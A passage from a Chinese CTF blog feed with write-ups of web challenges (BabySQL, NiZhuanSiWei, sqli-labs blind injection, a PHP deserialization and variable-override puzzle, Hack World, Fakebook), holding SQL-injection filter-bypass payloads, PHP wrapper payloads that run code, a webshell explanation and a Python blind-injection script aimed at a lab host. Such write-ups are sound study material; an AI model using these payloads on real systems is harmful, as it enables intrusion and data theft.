</li>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ol>
<li><h5 id="MIME协议"><a href="#MIME协议" class="headerlink" title="MIME协议"></a>MIME协议</h5><p>最早的HTTP协议中，并没有附加的数据类型信息，所有传送的数据都被客户程序解释为超文本标记语言HTML 文档，而为了支持多媒体数据类型，HTTP协议中就使用了附加在文档之前的MIME数据类型信息来标识数据类型。</p>
<p>　　MIME意为多目Internet邮件扩展，它设计的最初目的是为了在发送电子邮件时附加多媒体数据，让邮件客户程序能根据其类型进行处理。然而当它被HTTP协议支持之后，它的意义就更为显著了。它使得HTTP传输的不仅是普通的文本，而变得丰富多彩。</p>
<p>　　每个MIME类型由两部分组成，前面是数据的大类别，例如声音audio、图象image等，后面定义具体的种类。</p>
<p>　　常见的MIME类型</p>
<p>　　超文本标记语言文本 .html,.html text/html</p>
<p>　　普通文本 .txt text/plain</p>
<p>　　RTF文本 .rtf application/rtf</p>
<p>　　GIF图形 .gif image/gif</p>
<p>　　JPEG图形 .jpeg,.jpg image/jpeg</p>
<p>　　au声音文件 .au audio/basic</p>
<p>　　MIDI音乐文件 mid,.midi audio/midi,audio/x-midi</p>
<p>　　RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio</p>
<p>　　MPEG文件 .mpg,.mpeg video/mpeg</p>
<p>　　AVI文件 .avi video/x-msvideo</p>
<p>　　GZIP文件 .gz application/x-gzip</p>
<p>　　TAR文件 .tar application/x-tar</p>
<p>由于MIME类型与文档的后缀相关，因此服务器使用文档的后缀来区分不同文件的MIME类型，服务器中必须定义文档后缀和MIME类型之间的对应关系。而客户程序从服务器上接收数据的时候，它只是从服务器接受数据流，并不了解文档的名字，因此服务器必须使用附加信息来告诉客户程序数据的MIME类型。服务器在发送真正的数据之前，就要先发送标志数据的MIME类型的信息，这个信息使用Content-type关键字进行定义。</p>
</li>
<li><h5 id="phtml"><a href="#phtml" class="headerlink" title="phtml"></a>phtml</h5><p>其实我现在也没怎么懂。可能php里面是纯的php代码，而phtml中是js代码，不过通过修改language可以达到php的效果。</p>
<p>两者在服务器上的效果是一样的。</p>
</li>
<li><h5 id="一句话木马的执行原理"><a href="#一句话木马的执行原理" class="headerlink" title="一句话木马的执行原理"></a>一句话木马的执行原理</h5><p>eval函数中的字符串会被当做PHP语句来执行，其中用post的方式提交了一个变量，因此这个变量的具体值是我们可以控制的，而菜刀、蚁剑此类工具就是利用这个变量传入其他语句，本质上是一种小马传大马的方式。</p>
</li>
</ol>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-4 buuoj [极客大挑战 2019]BabySQL</title>
    <url>/2020/12/15/web-4/</url>
    <content><![CDATA[<h1 id="buuoj-极客大挑战-2019-BabySQL"><a href="#buuoj-极客大挑战-2019-BabySQL" class="headerlink" title="buuoj [极客大挑战 2019]BabySQL"></a>buuoj [极客大挑战 2019]BabySQL</h1><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>两个输入框，用户名试一下admin，密码随便试试。（后来看wp才知道，ctf比赛不是搞渗透测试，用户名尽量别用admin）</li>
<li>密码错误，对password试试注入。</li>
<li>根据回显判断应该用union联合注入，然而报错信息中没有显示各种关键词。</li>
<li>推断应该是对关键字进行了替换，尝试双写注入，最后成功绕过，得到flag。</li>
</ol>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
<li><p>随便试试</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.1.png?raw=true"></p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.2.png?raw=true"></p>
<p>有回显，试试union联合注入。</p>
</li>
<li><p>然而发现有神奇的错误回显</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.3.png?raw=true"></p>
<p>错误信息没有显示union和select？难道是过滤了？试试先。</p>
</li>
<li><p>看来是用了replace函数对关键字进行了替换，那可以试一下双写注入过滤。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.4.png?raw=true"></p>
</li>
<li><p>似乎可以，继续查询表信息</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.5.png?raw=true"></p>
</li>
<li><p>然后好像还有过滤，都是报错信息中没有显示，继续尝试双写注入</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.6.png?raw=true"></p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.7.png?raw=true"></p>
</li>
<li><p>双写information没用？？？想起来information好像也不是什么关键字，猜测可能是过滤了or</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.8.png?raw=true"></p>
<p>在or前加的注释语句，然而报错只回显了mation……把or给忽略了，看来是直接过滤了or</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.9.png?raw=true"></p>
<p>or绕过了，where好像也有过滤</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.10.png?raw=true"></p>
</li>
<li><p>查询成功，然后再爆列名和字段名</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.11.png?raw=true"></p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-4.12.png?raw=true"></p>
<p>成功获得flag。</p>
</li>
</ol>
</li>
</ul>
<ul>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><p>关于sql中的关键字绕过：</p>
<h4 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a>绕过union，select，where等：</h4><h5 id="（1）使用注释符绕过："><a href="#（1）使用注释符绕过：" class="headerlink" title="（1）使用注释符绕过："></a>（1）使用注释符绕过：</h5><p>　　常用注释符：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;，-- , &#x2F;**&#x2F;, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure>

<p>　　用法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">U&#x2F;**&#x2F; NION &#x2F;**&#x2F; SE&#x2F;**&#x2F; LECT &#x2F;**&#x2F;user，pwd from user</span><br></pre></td></tr></table></figure>

<h5 id="（2）使用大小写绕过："><a href="#（2）使用大小写绕过：" class="headerlink" title="（2）使用大小写绕过："></a>（2）使用大小写绕过：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39;UnIoN&#x2F;**&#x2F;SeLeCT</span><br></pre></td></tr></table></figure>

<h5 id="（3）内联注释绕过："><a href="#（3）内联注释绕过：" class="headerlink" title="（3）内联注释绕过："></a>（3）内联注释绕过：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39;&#x2F;*!UnIoN*&#x2F; SeLeCT 1,2,concat(&#x2F;*!table_name*&#x2F;) FrOM &#x2F;*information_schema*&#x2F;.tables &#x2F;*!WHERE *&#x2F;&#x2F;*!TaBlE_ScHeMa*&#x2F; like database()#</span><br></pre></td></tr></table></figure>

<h5 id="（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）："><a href="#（4）-双关键字绕过（若删除掉第一个匹配的union就能绕过）：" class="headerlink" title="（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）："></a>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）：</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;-1&#39;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>

<h5 id="通用绕过（编码）："><a href="#通用绕过（编码）：" class="headerlink" title="通用绕过（编码）："></a>通用绕过（编码）：</h5><p>　　如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or 1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure>

</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>buuoj[ZJCTF 2019]NiZhuanSiWei</title>
    <url>/2020/12/22/web-5/</url>
    <content><![CDATA[<h2 id="web-5-buuoj-ZJCTF-2019-NiZhuanSiWei"><a href="#web-5-buuoj-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="web-5 buuoj [ZJCTF 2019]NiZhuanSiWei"></a>web-5 buuoj [ZJCTF 2019]NiZhuanSiWei</h2><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><p>get方式提交三个参数，然后通过一系列操作查看flag。</p>
</li>
<li><p>首先提交一个指定内容的text文件。</p>
</li>
<li><p>因为有flag关键词的过滤，所以不能直接查看，根据提示先查看一下useless.php。</p>
</li>
<li><p>运用反序列化的漏洞查看flag。</p>
<p>（然而我第二步就不知道怎么做了，看了wp才记起还有php伪协议这好东西……）</p>
</li>
</ol>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><p>1.get方式提交text，if语句中用了file_get_contents()函数，意味着text需要是个文件，于是就可以使用data协议传入。</p>
<p>data协议读入文件的格式：data://text/plain,文件内容</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-5.1.png?raw=true"></p>
<p>2.第一层if绕过了，现在要想办法通过传file查看一下useless.php文件，这里同样用php伪协议对文件直接进行读取。</p>
<p>格式:php://filter/read/convert.base64-encode/resource=文件名</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-5.2.png?raw=true"></p>
<p>因为要是base64的方式查看，所以得到的东西要用base64解码一下</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-5.6.png?raw=true"></p>
<p>3.然后是经典php反序列化的问题了，用在线php写一个就完了</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-5.3.png?raw=true"></p>
<p>然后提交</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-5.4.png?raw=true"></p>
<p>这里的useless不需要查看了，所以也不需要php伪协议了。</p>
<p>4.得到flag</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-5.5.png?raw=true"></p>
</li>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ol>
<li><p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
<p>Example：<u>?file=file://D:/soft/phpStudy/WWW/phpcode.txt</u></p>
</li>
<li><p>php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。</p>
<p>Example：<u>?file=php://filter/read=convert.base64-encode/resource=./cmd.php</u></p>
<p>​                   <u>?file=php://input &lt;?php phpinfo()?&gt;</u></p>
</li>
<li><p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
<p>Example：<u>?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt</u></p>
</li>
<li><p>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
<p>Example：<u>?file=data://text/plain,&lt;?php phpinfo()?&gt;</u></p>
</li>
</ol>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs5 盲注入门</title>
    <url>/2020/12/24/sqli5/</url>
    <content><![CDATA[<h1 id="sqli-labs5-盲注入门"><a href="#sqli-labs5-盲注入门" class="headerlink" title="sqli-labs5 盲注入门"></a>sqli-labs5 盲注入门</h1><blockquote>
<ul>
<li><h4 id="布尔型注入"><a href="#布尔型注入" class="headerlink" title="布尔型注入"></a>布尔型注入</h4></li>
<li><h4 id="时间延迟型注入"><a href="#时间延迟型注入" class="headerlink" title="时间延迟型注入"></a>时间延迟型注入</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="布尔型注入-1"><a href="#布尔型注入-1" class="headerlink" title="布尔型注入"></a>布尔型注入</h3><ol>
<li><p>象征性检查一下注入方式（题目写的比较明白了）</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/sqli5.1.png?raw=true"></p>
</li>
<li><p>检查列数</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/sqli5.2.png?raw=true"></p>
</li>
<li><p>通过left函数截取database的前半段字符并进行判断（此处也可以用substr函数直接截取其中的任意一段）</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/sqli5.3.png?raw=true"></p>
</li>
<li><p>当然不可能自己挨个试了，我知道的方法有三种：</p>
<ul>
<li>手工二分法判断</li>
<li>扔burpsuite直接爆破</li>
<li>大佬们通常都写py脚本来跑</li>
</ul>
<p>这里我用的burpsuite来爆的</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/sqli5.4.png?raw=true"></p>
<p>这样就得知database名第一个字母是‘s’，然后通过调整left的参数和字段名最后爆出database名。</p>
</li>
<li><p>然后接着爆库名表名。。。就完了。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/sqli5.5.png?raw=true"></p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/sqli5.6.png?raw=true"></p>
</li>
</ol>
</li>
</ul>
<ul>
<li><h3 id="时间延迟型注入-1"><a href="#时间延迟型注入-1" class="headerlink" title="时间延迟型注入"></a>时间延迟型注入</h3><p>……好麻烦不想写了……</p>
<p>（算了简单写写思路吧）</p>
<p>时间延迟型注入主要应用了<strong>if()**和</strong>sleep()**函数。</p>
<p>*if(条件语句,a,b)*：执行条件语句，如果结果为真则返回a，若为假则返回为b。</p>
<p>*sleep(a)*：让浏览器歇a秒后再返回。</p>
<p>把两者一结合我们就可以构造这样的语句了：</p>
<p>?id=1’ and if(left((select database()),1),sleep(3),1)=’s’ –+</p>
<p>在这个例子中，如果database名的第一个字母是s，浏览器就会先加载3s再返回，否则会直接显示。</p>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>新生赛web3-混元形意</title>
    <url>/2020/12/24/web-6/</url>
    <content><![CDATA[<h1 id="web-6-新生赛web-混元形意"><a href="#web-6-新生赛web-混元形意" class="headerlink" title="web-6 新生赛web-混元形意"></a>web-6 新生赛web-混元形意</h1><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="实名吐槽"><a href="#实名吐槽" class="headerlink" title="实名吐槽"></a>实名吐槽</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3></li>
</ul>
<ol>
<li>PHP代码审计，发现有反序列化函数，尝试构造字符串利用反序列化漏洞。</li>
<li>对get提交的参数存在过滤，尝试绕过。</li>
<li>通过unset和extract函数实现变量覆盖，绕过过滤。</li>
</ol>
<ul>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3></li>
</ul>
<ol>
<li>首先往下找找，发现unserialize函数，可以通过构造特殊的字符串来执行特定的命令。</li>
</ol>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-6.1.png?raw=true"></p>
<p>​        然后找到hashteam函数，看看它到底搞了个什么</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-6.2.png?raw=true"></p>
<ol start="2">
<li><p>然而hashteam函数执行的是Orbic函数，直接输出了“Orbic”，没有像我们希望的执行Qu4ck函数，但是在构造反序列化的字符串的时候却可以实现在hashteam函数中调用Qu4ck。根据要求写一个PHP小程序跑一下。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-6.3.png?raw=true"></p>
</li>
<li><p>假如程序能顺利地执行这条语句就ok了，然而我们注意到在中间还有这么一句代码：</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-6.4.png?raw=true"></p>
<p>顺着函数名找到函数中的操作：</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-6.5.png?raw=true"></p>
<p>mdzz这可能是个几乎没有毛病的过滤，一波操作把大小写字母数字还有_$字符都过滤了。这时候看看其他语句，看看能不能找到什么特殊的绕过的方法。</p>
</li>
<li><p>注意到这几条语句</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-6.7.png?raw=true"></p>
<p>extract函数能将数组的键名作为变量名，键值作为变量值，将键名对应的变量赋值，EXTR_SKIP则可以防止此次操作会覆盖上一次操作。</p>
<p>unset函数能将一个变量销毁（相当于在后面的执行过程中没有定义过该变量了）</p>
<p>综合一下，extract可以重新定义并初始化一个变量，而unset能将变量销毁，中间的过滤是但凡有$_GET[]都无法正常运行的（$_GET[]却是系统早就定义好的），聪明的你一定有什么想法了对吧？没错，我们可以将$_GET[]先销毁，然后再想办法让它重新被赋值。</p>
</li>
<li><p> 注意，这里除了以get方式提交参数，还能以post的方式提交一个参数，这或许会成为我们的突破口，结合extract函数，是不是如果提交一个_GET[shell]=xxx样式的参数就可以让$_GET[shell]在被销毁之后无中生有了。</p>
</li>
<li><p>现在重构的计划有了，但销毁的计划还差点，这里有必要认真分析一下这两个循环里面的代码了。然而一顿操作后我还是看不懂它要干什么（好吧是我太菜了）。那就代入具体的值模拟一下试试吧……</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>)<span class="keyword">as</span> <span class="variable">$k</span>)&#123;</span><br><span class="line">    <span class="comment">//$k = _POST </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$$k</span>)&#123;</span><br><span class="line">        <span class="comment">//$$k = $_POST &#123;_GET[shell] =&gt; xxx&#125;</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$$k</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line">            <span class="comment">// $key = _GET[shell] </span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$$key</span>)&amp;&amp;<span class="variable">$$key</span>==<span class="variable">$value</span>)</span><br><span class="line">            <span class="comment">//$$key = $_GET[shell] = xxx(get提交的！！！) </span></span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一波分析后，发现要是$_GET[shell]=xxx就可以成功销毁它了，注意：此时$_GET[shell]是个变量，而它是可以通过get方式提交的！！！</p>
<p>那最后答案也很明了了，post一个_GET[shell]=xxx,再get一个shell=xxx，这里的xxx就是我们前面构造的利用反序列化的字符串了。</p>
</li>
</ol>
<ul>
<li><h3 id="实名吐槽-1"><a href="#实名吐槽-1" class="headerlink" title="实名吐槽"></a>实名吐槽</h3><h6 id="太多了也没法说，归根结底也就是一句话：我太菜了…"><a href="#太多了也没法说，归根结底也就是一句话：我太菜了…" class="headerlink" title="太多了也没法说，归根结底也就是一句话：我太菜了…"></a>太多了也没法说，归根结底也就是一句话：我太菜了…</h6></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-7buuoj[CISCN2019 华北赛区 Day2 Web1]Hack World</title>
    <url>/2020/12/25/web-7/</url>
    <content><![CDATA[<h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h1><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>一个输入框，大概是要sql注入了，经过判断是数字型注入。</li>
<li>观察回显，判断应该是bool型盲注。</li>
<li>检查一下被过滤的各种字符和关键词。</li>
<li>利用python脚本进行爆破。</li>
</ol>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
<li><p>post提交id=1，回显正确，提交id=1’报错，判断是单引号闭合。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.2.png?raw=true"></p>
</li>
<li><p>只回显对错而不是完整的错误信息，这里大概是要盲注了，先试试and，or几个关键词有没有被过滤。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.3.png?raw=true"></p>
<p>and，or都被滤了，那可以考虑用^运算来绕过。</p>
</li>
<li><p>在这之前我们发现空格也被过滤了，经过尝试发现(),%0a,tab等字符可以绕过空格，小括号没有过滤也意味着我们能自由地使用盲注时需要的一些函数。接下来尝试select等关键词有没有被过滤。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.4.png?raw=true"></p>
<p>select，from都能正常表达，下面开始尝试构造注入字段。</p>
</li>
<li><p>因为这里用^，0^1=1,1^1=1，所以可以构造0^(sql判断语句)，如果sql语句返回为true，页面正常回显，否则错误回显。又因为题目已经提醒了，flag在flag表的flag的列中，所以可以构造如下sql语句：</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-7.5.png?raw=true"></p>
</li>
<li><p>基本的思路已经有了，然后写个脚本跑一下就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://26204341-4999-42c6-a88d-986ee280d68e.node3.buuoj.cn&#x27;</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    l = <span class="number">33</span></span><br><span class="line">    r = <span class="number">130</span></span><br><span class="line">    mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (l &lt; r):</span><br><span class="line">        payload[<span class="string">&#x27;id&#x27;</span>] = <span class="string">&#x27;0^&#x27;</span> + <span class="string">&#x27;(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        html = requests.post(url, data=payload)</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            l = mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = mid</span><br><span class="line">        mid = (l + r) &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">    print(result)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>成功拿到flag。</p>
</li>
</ol>
</li>
</ul>
<ul>
<li><h3 id="get的新姿势-1"><a href="#get的新姿势-1" class="headerlink" title="get的新姿势"></a>get的新姿势</h3><ol>
<li>关于空格的绕过姿势。/**/, (), tab, %0b……</li>
<li>盲注支持与，或，异或等多种逻辑判断，本质是构造一个返回值是0或1的语句来进行判断。</li>
<li>python网络编程（别催了寒假一定）</li>
</ol>
</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>web-8 buuoj [网鼎杯 2018]Fakebook</title>
    <url>/2020/12/28/web-8/</url>
    <content><![CDATA[<h2 id="buuoj-网鼎杯-2018-Fakebook"><a href="#buuoj-网鼎杯-2018-Fakebook" class="headerlink" title="buuoj [网鼎杯 2018]Fakebook"></a>buuoj [网鼎杯 2018]Fakebook</h2><blockquote>
<ul>
<li><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4></li>
<li><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4></li>
<li><h4 id="get的新姿势"><a href="#get的新姿势" class="headerlink" title="get的新姿势"></a>get的新姿势</h4></li>
</ul>
</blockquote>
<a id="more"></a>

<ul>
<li><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>打开一个网站，先注册个账号试试，没什么明显的问题，打开扫描器扫扫。</li>
<li>扫到一个user.php，发现get函数，猜想可能存在ssrf漏洞，但发现blog变量有严格的过滤。</li>
<li>进入注册用户的界面，发现有get请求，尝试sql注入。</li>
<li>sql注入绕过后，泄露了提交过程中的序列化字符串，因此可以构造特定的字符串实现ssrf攻击。</li>
</ol>
</li>
<li><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ol>
<li><p>一个破网站，暴力破解试了试没用，只能乖乖的注册一个账号。</p>
<p><img src="https://github.com/moonflowersl/moonflowersl.github.io/blob/main/images/web-8.1.png?raw=true"></p>
<p>然后扫描器扫出了一些奇怪的东西</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    